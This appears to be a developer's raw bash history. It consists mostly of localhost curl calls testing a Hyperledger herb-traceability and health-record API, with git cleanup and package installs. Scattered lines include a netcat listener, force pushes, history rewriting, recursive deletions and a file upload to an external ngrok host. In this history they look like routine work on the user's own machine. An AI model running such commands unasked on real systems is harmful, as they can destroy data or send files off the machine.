history | sed  > selected_history.txt

history
git push -u origin main
git remote set-url  origin git@github.com:BhuvanB404/new-blockchain-.git
git remote set-utl  origin git@github.com:BhuvanB404/new-blockchain-.git
git remote add origin git@github.com:BhuvanB404/new-blockchain-.git
git commit -m "Blockchian should work in everyones system"
git status
git restore --staged server-node-sdk/wallet/
git add .
cd ..
curl -X POST http://localhost:5000/createHerbBatch \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer02",
    "batchId": "BATCH-INVALID-GPS",
    "herbName": "Ashwagandha",
    "harvestDate": "2024-11-15",
    "farmLocation": "Invalid Location",
    "quantity": "100kg",
    "gpsCoordinates": {
      "latitude": 25.0000,
      "longitude": 80.0000
    },
    "environmentalData": {
      "temperature": "28°C",
      "humidity": "75%",
      "soilType": "Unknown"
    }
  }'

curl -X POST http://localhost:5000/fetchLedger \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01"
  }' | jq '.'
curl -X POST http://localhost:5000/getBatchesByFarmer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "farmerId": "Farmer02"
  }'
ls wallet/
cd server-node-sdk/
curl -X POST http://localhost:5000/getBatchesByFarmer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "farmerId": "Farmer02"
  }' | jq '.'
curl -X POST http://localhost:5000/getConsumerInfo \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "medicineId": "MED-ASHWA-001"
  }' | jq '.data' | jq '.'
curl -X POST http://localhost:5000/fetchLedger \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01"
  }' | jq '.data[] | select(.medicineId != null) | {medicineId, medicineName, batchIds}'
curl -X POST http://localhost:5000/getConsumerInfo \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "medicineId": "MED-ASHWA-001"
  }'
curl -X POST http://localhost:5000/createMedicine \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Manufacturer02",
    "medicineId": "MED-ASHWA-001",
    "medicineName": "Ashwagandha Capsules",
    "batchIds": ["BATCH-ASH-001"],
    "manufacturingDate": "2024-11-25",
    "expiryDate": "2026-11-25"
  }'
curl -X POST http://localhost:5000/getConsumerInfo \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "batchId": "BATCH-ASH-001"
  }'
curl -X POST http://localhost:5000/getConsumerInfo \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "batchId": "BATCH-ASH-001"
  }' | jq '.data' | jq '.'
curl -X POST http://localhost:5000/getConsumerInfo \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "medicineId": "BATCH-ASH-001"
  }'
curl -X POST http://localhost:5000/getConsumerInfo \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "medicineId": "BATCH-ASH-001"
  }' | jq '.data' | jq '.'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "QualityLab01",
    "batchId": "NON-EXISTENT-BATCH",
    "labId": "QualityLab01",
    "testType": "moisture",
    "testResults": {
      "moisture": 10.0,
      "purity": 95.0
    },
    "testDate": "2024-11-29T10:00:00Z",
    "certification": "TEST-CERT-001",
    "labLocation": "AIIMS Delhi"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer02",
    "batchId": "BATCH-ASH-001",
    "labId": "UnauthorizedLab",
    "testType": "unauthorized_test",
    "testResults": {
      "moisture": 10.0,
      "purity": 95.0
    },
    "testDate": "2024-11-29T09:00:00Z",
    "certification": "FAKE-CERT-001",
    "labLocation": "Fake Location"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer01",
    "batchId": "BATCH-ASH-001",
    "labId": "UnauthorizedLab",
    "testType": "unauthorized_test",
    "testResults": {
      "moisture": 10.0,
      "purity": 95.0
    },
    "testDate": "2024-11-29T09:00:00Z",
    "certification": "FAKE-CERT-001",
    "labLocation": "Fake Location"
  }'
curl -X POST http://localhost:5000/transferBatch \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer02",
    "batchId": "BATCH-ASH-001",
    "toEntityId": "QualityLab01",
    "transferReason": "Sale to manufacturer for processing"
  }'
ls
curl -X POST http://localhost:5000/getBatchDetails \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "QualityLab01",
    "batchId": "BATCH-ASH-001"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "QualityLab01",
    "batchId": "BATCH-ASH-001",
    "labId": "QualityLab01",
    "testType": "pesticide_failure",
    "testResults": {
      "moisture": 8.5,
      "pesticide": 1.2,
      "purity": 97.0,
      "organochlorines": 0.8,
      "organophosphates": 0.4
    },
    "testDate": "2024-11-26T09:15:00Z",
    "certification": "FAIL-PEST-2024-001",
    "labLocation": "Pune Testing Facility - Contamination Lab"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "QualityLab01",
    "batchId": "BATCH-TUR-LAB001",
    "labId": "QualityLab01",
    "testType": "pesticide_failure",
    "testResults": {
      "moisture": 8.5,
      "pesticide": 1.2,
      "purity": 97.0,
      "organochlorines": 0.8,
      "organophosphates": 0.4
    },
    "testDate": "2024-11-26T09:15:00Z",
    "certification": "FAIL-PEST-2024-001",
    "labLocation": "Pune Testing Facility - Contamination Lab"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "PesticideLab03",
    "batchId": "BATCH-TUR-LAB001",
    "labId": "PesticideLab03",
    "testType": "pesticide_failure",
    "testResults": {
      "moisture": 8.5,
      "pesticide": 1.2,
      "purity": 97.0,
      "organochlorines": 0.8,
      "organophosphates": 0.4
    },
    "testDate": "2024-11-26T09:15:00Z",
    "certification": "FAIL-PEST-2024-001",
    "labLocation": "Pune Testing Facility - Contamination Lab"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "QualityLab01",
    "batchId": "BATCH-ASH-001",
    "labId": "QualityLab01",
    "testType": "heavy_metals",
    "testResults": {
      "lead": 0.08,
      "cadmium": 0.02,
      "mercury": 0.01,
      "arsenic": 0.05,
      "chromium": 0.15
    },
    "testDate": "2024-11-23T16:20:00Z",
    "certification": "NABL-HM-2024-001",
    "labLocation": "AIIMS Delhi - Advanced Testing Wing"
  }'
curl -X POST http://localhost:5000/addQualityTest \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "QualityLab01",
    "batchId": "BATCH-ASH-001",
    "labId": "QualityLab01",
    "testType": "moisture",
    "testResults": {
      "moisture": 11.2,
      "temperature": 23.5,
      "humidity": 65.0,
      "testDuration": 4.5
    },
    "testDate": "2024-11-20T09:30:00Z",
    "certification": "NABL-MC-2024-001",
    "labLocation": "AIIMS Delhi - Block C, Room 205"
  }'
curl -X POST http://localhost:5000/onboardLaboratory \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "LabOverseer01",
    "laboratoryId": "QualityLab01",
    "labName": "Central Ayurveda Quality Control Lab - Accredited",
    "location": "AIIMS Delhi - Block C",
    "accreditation": "NABL-17025-2024-CERT",
    "certifications": ["ISO-17025:2017", "AYUSH-QC-Level-1", "FSSAI-Testing-Auth"]
  }'
curl -X POST http://localhost:5000/registerLaboratory \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "labAdmin",
    "userId": "QualityLab01",
    "labName": "Central Ayurveda Quality Control Lab",
    "location": "AIIMS Delhi",
    "accreditation": "NABL-17025-2024",
    "certifications": ["ISO-17025", "AYUSH-QC", "FSSAI-Testing"]
  }'
node onboard_lab_overseer.js
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"userId": "Regulator01"}'
curl -X POST http://localhost:5000/transferBatch \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer02",
    "batchId": "BATCH-ASH-001",
    "toEntityId": "Manufacturer02",
    "transferReason": "Sale to manufacturer for processing"
  }'
curl -X POST http://localhost:5000/transferBatch \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer01",
    "batchId": "BATCH-ASH-001",
    "toEntityId": "Manufacturer01",
    "transferReason": "Sale to manufacturer for processing"
  }'
curl -X POST http://localhost:5000/createHerbBatch \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Farmer02",
    "batchId": "BATCH-ASH-001",
    "herbName": "Ashwagandha",
    "harvestDate": "2024-11-15",
    "farmLocation": "Wayanad, Kerala",
    "quantity": "250kg",
    "gpsCoordinates": {
      "latitude": 11.6854,
      "longitude": 76.1320
    },
    "collectorId": "Farmer01",
    "environmentalData": {
      "temperature": "28°C",
      "humidity": "75%",
      "soilType": "Red laterite soil"
    }
  }'
rm -rf cert-script/wallet/
ls cert-script/wallet/
curl -X POST http://localhost:5000/onboardManufacturer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "manufacturerId": "Manufacturer02",
    "companyName": "Patanjali Ayurved",
    "name": "Dr. Acharya Balkrishna",
    "location": "Haridwar, Uttarakhand"
  }'
curl -X POST http://localhost:5000/onboardManufacturer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "manufacturerId": "Manufacturer01",
    "companyName": "Patanjali Ayurved",
    "name": "Dr. Acharya Balkrishna",
    "location": "Haridwar, Uttarakhand"
  }'
curl -X POST http://localhost:5000/registerManufacturer \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "regulatorAdmin",
    "userId": "Manufacturer02",
    "companyName": "Himalaya Herbal Healthcare",
    "name": "Dr. Meera Sharma",
    "location": "Bengaluru, Karnataka"
  }'
curl -X POST http://localhost:5000/onboardFarmer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "farmerId": "Farmer02",
    "name": "Ramesh Patel",
    "farmLocation": "Wayanad, Kerala"
  }'
url -X POST http://localhost:5000/onboardFarmer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "farmerId": "Farmer02",
    "name": "Ramesh Patel",
    "farmLocation": "Wayanad, Kerala"
  }'
curl -X POST http://localhost:5000/registerFarmer \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "regulatorAdmin",
    "userId": "Farmer02",
    "name": "Raj Kumar",
    "farmLocation": "Mysuru, Karnataka"
  }'

node ayurveda_onboard_regulator.js
node org2_admin.js
node ayurveda_admin_reg.js

lss
rm -rf wallet/
clear
clea
# This should fail - manufacturer trying to fetch ledger
curl -X POST http://localhost:5000/fetchLedger \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01"
}'
# This should fail - manufacturer trying to fetch ledger
curl -X POST http://localhost:5000/fetchLedger \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer002"
}'
# This should fail - manufacturer trying to fetch ledger
curl -X POST http://localhost:5000/fetchLedger \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer001"
}'
# This should fail - farmer trying to create medicine
curl -X POST http://localhost:5000/createMedicine \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "medicineId": "medicine002",
  "medicineName": "Test Medicine",
  "batchIds": ["batch001"],
  "manufacturingDate": "2025-09-19T00:00:00.000Z",
  "expiryDate": "2027-09-19T00:00:00.000Z"
}'
curl -X POST http://localhost:5000/fetchLedger \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01"
}'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01",
  "assetId": "medicine0011"
}'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01",
  "assetId": "batch0011"
}'
curl -X POST http://localhost:5000/trackSupplyChain \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer002",
  "itemId": "medicine0011"
}'
curl -X POST http://localhost:5000/trackSupplyChain \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer001",
  "itemId": "medicine001"
}'
curl -X POST http://localhost:5000/getMedicineDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer002",
  "medicineId": "medicine0011"
}'
curl -X POST http://localhost:5000/getMedicineDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer001",
  "medicineId": "medicine0011"
}'
curl -X POST http://localhost:5000/getBatchDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch0011"
}'
curl -X POST http://localhost:5000/getBatchDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch0022"
}'
curl -X POST http://localhost:5000/getBatchDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch011"
}'
curl -X POST http://localhost:5000/getBatchDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch001"
}'
curl -X POST http://localhost:5000/createMedicine \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer002",
  "medicineId": "medicine0011",
  "medicineName": "Turmeric Ashwagandha Capsules",
  "batchIds": ["batch0011", "batch0022"],
  "manufacturingDate": "2025-09-19T00:00:00.000Z",
  "expiryDate": "2027-09-19T00:00:00.000Z"
}'
curl -X POST http://localhost:5000/createMedicine \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer002",
  "medicineId": "medicine001",
  "medicineName": "Turmeric Ashwagandha Capsules",
  "batchIds": ["batch0011", "batch0022"],
  "manufacturingDate": "2025-09-19T00:00:00.000Z",
  "expiryDate": "2027-09-19T00:00:00.000Z"
}'
curl -X POST http://localhost:5000/transferBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch0022",
  "toEntityId": "manufacturer002",
  "transferReason": "Sale to manufacturer for medicine production"
}'
curl -X POST http://localhost:5000/createHerbBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch0022",
  "herbName": "Ashwagandha",
  "harvestDate": "2025-09-10T00:00:00.000Z",
  "farmLocation": "Kerala, India",
  "quantity": "50kg"
}'
curl -X POST http://localhost:5000/createHerbBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "Rajesh",
  "batchId": "batch0011",
  "herbName": "Turmeric",
  "harvestDate": "2025-09-15T00:00:00.000Z",
  "farmLocation": "Kerala, India",
  "quantity": "100kg"
}'
curl -X POST http://localhost:5000/onboardFarmer \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01",
  "farmerId": "Rajesh",
  "name": "Ravi Kumar", 
  "farmLocation": "Kerala, India"
}'
curl -X POST http://localhost:5000/registerFarmer \
-H "Content-Type: application/json" \
-d '{
  "adminId": "regulatorAdmin",
  "userId": "Rajesh", 
  "name": "Ravi Kumar",
  "farmLocation": "Kerala, India"
}'
curl -X POST http://localhost:5000/createMedicine \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer002",
  "medicineId": "medicine001",
  "medicineName": "Turmeric Ashwagandha Capsules",
  "batchIds": ["batch001", "batch002"],
  "manufacturingDate": "2025-09-19T00:00:00.000Z",
  "expiryDate": "2027-09-19T00:00:00.000Z"
}'
curl -X POST http://localhost:5000/onboardManufacturer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "manufacturerId": "manufacturer002",
    "companyName": "AyurMeds Pvt Ltd",
    "name": "Dr. Sharma",
    "location": "Pune, India"
  }'
curl -X POST http://localhost:5000/registerManufacturer \
-H "Content-Type: application/json" \
-d '{
  "adminId": "regulatorAdmin",
  "userId": "manufacturer002",
  "companyName": "AyurMeds Pvt Ltd",
  "name": "Dr. Sharma",
  "location": "Pune, India"
}'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01",
  "assetId": "batch001"
}'
curl -X POST http://localhost:5000/onboardManufacturer \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Regulator01",
    "manufacturerId": "manufacturer001",
    "companyName": "AyurMeds Pvt Ltd",
    "name": "Dr. Sharma",
    "location": "Pune, India"
  }'
curl -X POST http://localhost:5000/createMedicine \
-H "Content-Type: application/json" \
-d '{
  "userId": "manufacturer001",
  "medicineId": "medicine001",
  "medicineName": "Turmeric Ashwagandha Capsules",
  "batchIds": ["batch001", "batch002"],
  "manufacturingDate": "2025-09-19T00:00:00.000Z",
  "expiryDate": "2027-09-19T00:00:00.000Z"
}'
curl -X POST http://localhost:5000/transferBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "batchId": "batch002",
  "toEntityId": "manufacturer001",
  "transferReason": "Sale to manufacturer for medicine production"
}'
curl -X POST http://localhost:5000/transferBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "batchId": "batch001",
  "toEntityId": "manufacturer001",
  "transferReason": "Sale to manufacturer for medicine production"
}'
curl -X POST http://localhost:5000/getBatchesByFarmer \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "farmerId": "farmer011"
}'
curl -X POST http://localhost:5000/getBatchDetails \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "batchId": "batch001"
}'
curl -X POST http://localhost:5000/createHerbBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "batchId": "batch002",
  "herbName": "Ashwagandha",
  "harvestDate": "2025-09-10T00:00:00.000Z",
  "farmLocation": "Kerala, India",
  "quantity": "50kg"
}'
curl -X POST http://localhost:5000/createHerbBatch \
-H "Content-Type: application/json" \
-d '{
  "userId": "farmer011",
  "batchId": "batch001",
  "herbName": "Turmeric",
  "harvestDate": "2025-09-15T00:00:00.000Z",
  "farmLocation": "Kerala, India",
  "quantity": "100kg"
}'
curl -X POST http://localhost:5000/onboardFarmer \
-H "Content-Type: application/json" \
-d '{
  "userId": "Regulator01",
  "farmerId": "farmer011",
  "name": "Ravi Kumar", 
  "farmLocation": "Kerala, India"
}'
curl -X POST http://localhost:5000/registerFarmer \
-H "Content-Type: application/json" \
-d '{
  "adminId": "regulatorAdmin",
  "userId": "farmer011", 
  "name": "Ravi Kumar",
  "farmLocation": "Kerala, India"
}'
curl -X POST http://localhost:5000/registerFarmer \
-H "Content-Type: application/json" \
-d '{
  "adminId": "Regulator01",
  "userId": "farmer011", 
  "name": "Ravi Kumar",
  "farmLocation": "Kerala, India"
}'
curl -X POST http://localhost:5000/registerFarmer \
-H "Content-Type: application/json" \
-d '{
  "adminId": "Regulator01",
  "userId": "farmer001", 
  "name": "Ravi Kumar",
  "farmLocation": "Kerala, India"
}'
node ayurveda_onboard_farmer.js
curl -X POST http://localhost:5000/registerFarmer \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "regulatorAdmin",
    "userId": "farmer001",
    "name": "Ravi Kumar",
    "farmLocation": "Kerala, India"
  }'
curl -X GET http://localhost:5000/status
node ayurveda_admin_reg.js
curl -X POST http://localhost:5000/registerManufacturer \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "regulatorAdmin",
    "userId": "manufacturer001",
    "companyName": "AyurMeds Pvt Ltd",
    "name": "Dr. Sharma",
    "location": "Pune, India"
  }'
cd /home/bb/sih/hyperledger/ehr-testing/server-node-sdk
curl -X POST http://localhost:5000/fetchLedger \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Hospital01"
  }'
curl -X POST http://localhost:5000/getRecordById \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "patientId": "patient001",
    "recordId": "R-ff57e56eedeba4c7c93c6ee62b8fa03ea22a52daeeeba070a852b050500d8a9b"
  }'
curl -X POST http://localhost:5000/grantAccess \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "patientId": "patient001",
    "doctorIdToGrant": "Doctor-Rama04"
  }'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "recordId": "R-00ae1074d2fd173f6eb887c197d4dfdc534e08729478ae0474475f6ebad7a564"
  }'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "recordId": "record-97b759772f396e65838d305e8b6607242d226f8ab3740774049ac22259c1c799"
  }'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "recordId": "R-97b759772f396e65838d305e8b6607242d226f8ab3740774049ac22259c1c799"
  }'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "recordId": "97b759772f396e65838d305e8b6607242d226f8ab3740774049ac22259c1c799"
  }'
curl -X POST http://localhost:5000/addRecord \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Doctor-Rama04",
    "patientId": "patient001",
    "diagnosis": "Type 2 Diabetes",
    "prescription": "Metformin 500mg twice daily, dietary modifications"
  }'
curl -X POST http://localhost:5000/queryHistoryOfAsset \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "recordId": "patient-patient001"
  }'
curl -X POST http://localhost:5000/getRecordById \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "patientId": "patient001",
    "recordId": "Record R-ff57e56eedeba4c7c93c6ee62b8fa03ea22a52daeeeba070a852b050500d8a9b"
  }'
curl -X POST http://localhost:5000/getAllRecordsByPatientId \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "patientId": "patient001"
  }'
curl -X POST http://localhost:5000/addRecord \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Doctor-Rama04",
    "patientId": "patient001",
    "diagnosis": "Hypertension",
    "prescription": "Lisinopril 10mg daily, low sodium diet"
  }'
curl -X POST http://localhost:5000/addRecord \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "Doctor01",
    "patientId": "patient001",
    "diagnosis": "Hypertension",
    "prescription": "Lisinopril 10mg daily, low sodium diet"
  }'
curl -X POST http://localhost:5000/grantAccess \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001",
    "patientId": "patient001",
    "doctorIdToGrant": "Doctor01"
  }'
curl -X POST http://localhost:5000/loginPatient \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "patient001"
  }'
curl -X POST http://localhost:5000/registerPatient \
  -H "Content-Type: application/json" \
  -d '{
    "adminId": "hospitalAdmin",
    "doctorId": "Doctor-Rama04",
    "userId": "patient001",
    "name": "John Doe",
    "dob": "1990-01-15",
    "city": "New York"
  }'
cd ../../server-node-sdk/
pwd
./network.sh down &&
./network.sh up createChannel -ca -s couchdb && ./network.sh deployCC -ccn ehrChainCode -ccp ../asset-transfer-basic/chaincode-javascript/ -ccl javascript
cd fabric-samples/test-network/
./install-fabric.sh
../../install-fabric.sh
cat README.md | xclip
cat README.md
cd EHR-Hyperledger-Fabric-Project/
git clone https://github.com/akshaykurhekar/EHR-Hyperledger-Fabric-Project.git
mv EHR-Hyperledger-Fabric-Project/ si
ls server-node-sdk/cert-script/
git checkout 55a3bfb
ls server-node-sdk/
git checkout origin/main
git archive
npm run dev
cd hyperledger/EHR-Hyperledger-Fabric-Project/fabric-samples/test-network/
node cert-script/checkNetwork.js
node cert-script/setupUsers.js
cd /home/bb/sih/hyperledger/EHR-Hyperledger-Fabric-Project/server-node-sdk

# Register the cooperative admin
node cert-script/registerOrg1Admin.js

# Register all herb traceability users
node cert-script/registerHerbTraceabilityUsers.js
# Deploy the chaincode with the new herb traceability logic
./network.sh deployCC -ccn ehrChainCode -ccp ../asset-transfer-basic/chaincode-javascript -ccl javascript
cd /home/bb/sih/hyperledger/EHR-Hyperledger-Fabric-Project/fabric-samples/test-network
./network.sh up createChannel
emacs fabric-samples/asset-transfer-basic/chaincode-javascript/lib/herbTraceabilityChaincode.js
./Cursor-1.5.11-x86_64.AppImage
rm -rf server-node-sdk/wallet/
ls server-node-sdk/wallet/
./HerbAbhilekh.sh
wget https://raw.githubusercontent.com/akshaykurhekar/EHR-Hyperledger-Fabric-Project/refs/heads/main/server-node-sdk/app.js
mv app.js  fuckyou.js
wget https://raw.githubusercontent.com/akshaykurhekar/EHR-Hyperledger-Fabric-Project/refs/heads/main/server-node-sdk/invoke.js
wget https://raw.githubusercontent.com/akshaykurhekar/EHR-Hyperledger-Fabric-Project/refs/heads/main/backup/helper.js
wget https://raw.githubusercontent.com/akshaykurhekar/EHR-Hyperledger-Fabric-Project/refs/heads/main/backup/query.js
cd sih/hemang/workingmess/
cd Downloads/
./fabric-samples/test-network/network.sh down
nvim HerbAbhilekh.sh
l
cat fabric-samples/test-network/.gitignore
find  . -name ".gitignore"
cat fabric-samples/.gitignore
cat .gitignore
find -r . -name ".gitignore"
ls -l -a *
ls -l -a *.giti
cd workingmess/
git clone git@github.com:Hemang360/workingmess.git
git clone https://github.com/Hemang360/workingmess
cd hemang/
mkdir -p hemang
cd ml/
cd hash-vizualisation/
cd sih/
poweroff
./outputlab3
gcc -o outputlab3 3.c
nvim 3.c
cd clg-java/dsa/
yay -S oneko
pacman -Ss oneko
oneko
btop
hollywood
yay -S hollywood
nmtui
nmcli c up bb --ask
nmcli c
sudo systemctl restart NetworkManager
iwctl
sudo pacman -S hollywood
sudo pacman -Ss hollywood
cacafire
echo 'fuck you'
ola
terminology
sudo pacman -Ss terminology
sudo pacman -S terminology
terminfo
ehco 'fuck you'
terminator
sudo pacman -S caca-fire
sudo pacman -Ss caca-fire
caca-fire
sudo pacman -Ss cacaofire
echo -e '\0' | xclip
echo -e '\0'
clang-format --style='file:../clang-format.config' 3.c -i
nvim 2.c
clang-format --style='file:../clang-format.config' 2.c -i
./outputlab1
cd dsa
clang-format --style='file:../clang-format.config' 1.c -i
clang-format --style='file:clang-format.config' 1.c -i
clang-format --style='file:clang-format.config' dsa/1.c -i
indent 1.c -linux -ts 50 -ut -l 160
indent 1.c -linux -ts 30 -ut -l 160
indent 1.c -linux  -ut -l 160
indent 1.c -linux -ts30 -ut -l 160
cd dsa/
cd clg-java/
man indent
indent --help
clang-format --style='file:clang-format.config' dsa/1.c
nc -l -p 6969
nvim clang-format.config
ifconfig
clang-format
clang format
sudo pacman -S indent
;s
mkdir -p dsa
rm firebase
ls acm/
rm create-admin.js
rm alembic.ini
ls alembic.ini
rm -rf package-lock.json  pci\ -nnk  install.sh  htop.txt  ctf/ dashboard.js
rm -rf qemu/ qemu-firmware/ wallet/ warner_eq.json  WhatsApp\ Image\ 2025-09-18\ at\ 10.04.25\ PM.jpeg  xmrig-cuda/ OSTP/ oai-cn5g/ mini-project-firebase\ credentials  gemini-api/ Arduino/  connection.json
sudo lsof -i :8080
sudo lsof -i :3000
sudo lsof -i :5000
docker kill 7fa65448f811
git push origin --all --force
git push origin --tags --force

git remote -v
git remote add origin git@github.com:Hemang360/Snack_Overflow.git
git remote -v

git branch
git push git push origin --all --force
git push origin --tags --force

git commit -m "cleaned up the repo and added a Readme.md"
ls New_Frontend/
ls frontend/
rm -rf server-node-sdk/cert-script/testing-files/
rm fabric-samples/asset-transfer-basic/chaincode-javascript/lib/ehrChainCode.js
rm fabric-samples/asset-transfer-basic/chaincode-javascript/lib/herbTraceabilityChaincode-v2.js
rm fabric-samples/asset-transfer-basic/chaincode-javascript/lib/assetTransfer.js
rm README1.md  idk.md
mv README2.md  README.md
mv README.md  idk.md
git filter-repo  --path FRONTEND_HANDOVER_README.md  --invert-paths
git filter-repo  --path BACKEND_STATUS.md  --invert-paths
git filter-repo  --path ARCHITECTURE.md  --invert-paths
git filter-repo  --path API_NEW.md --invert-paths
git filter-repo  --path API_DOCUMENTATION.md --invert-paths
git filter-repo  --path README_HERB_TRACEABILITY.md --invert-paths
git filter-repo  --path backup/ --invert-paths
git filter-repo  --path consumer-portal/ --invert-paths
git filter-repo  --path KOTLIN_APP_SETUP.md --invert-paths
git filter-repo  --path start-ngrok.sh --invert-paths
git filter-repo  --path test-clean-api.sh --path  test-herb-workflow.sh --invert-paths
git filter-repo  --path test-clean-api.sh  test-herb-workflow.sh --invert-paths
git filter-repo  --path validate-backend.sh --invert-paths
git filter-repo  --path kotlin-app-connection-profile.json --invert-paths
git filter-repo  --path api/ --invert-paths
cat  api/package-lock.json
ls api/
cd ~/Cleanup/Snack_Overflow/
git filter-repo  --path WORKFLOW_SUMMARY.md --invert-paths
cd Snack_Overflow/
git clone git@github.com:Hemang360/Snack_Overflow.git
cd Cleanup/
sudo pacman -S git-filter-repo

rm -rf start-ngrok.sh test-clean-api.sh  test-herb-workflow.sh  validate-backend.sh
git checkout blockchain
mkdir -p Cleanup
feh --bg-fill  wallhaven-mldl19_1920x1080.png
cd Pictures/Wallpapers/
feh -F -Z -x 'WhatsApp Image 2025-09-18 at 10.04.25 PM.jpeg' 

display -fullscreen WhatsApp\ Image\ 2025-09-18\ at\ 10.04.25\ PM.jpeg
sudo pacman -S imagemagick

feh -Z WhatsApp\ Image\ 2025-09-18\ at\ 10.04.25\ PM.jpeg
feh -F 'WhatsApp Image 2025-09-18 at 10.04.25 PM.jpeg'
feh --bg-fill  WhatsApp\ Image\ 2025-09-18\ at\ 10.04.25\ PM.jpeg
feh WhatsApp\ Image\ 2025-09-18\ at\ 10.04.25\ PM.jpeg
cd frontend/
cd New_Frontend/
node qr.js ID-3421423  id_123.png
npm install qrcode

npm init -y

npm install qr.js
cd Music/
curl -X POST \
  -F "image=@/home/bb/Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png" \
  "https://6d03a30c2174.ngrok-free.app/upload?pathPrefix=farmer-uploads&makePublic=false"
curl -X POST \
  -F "image=@/home/bb/Pictures/Wallpapers/" \
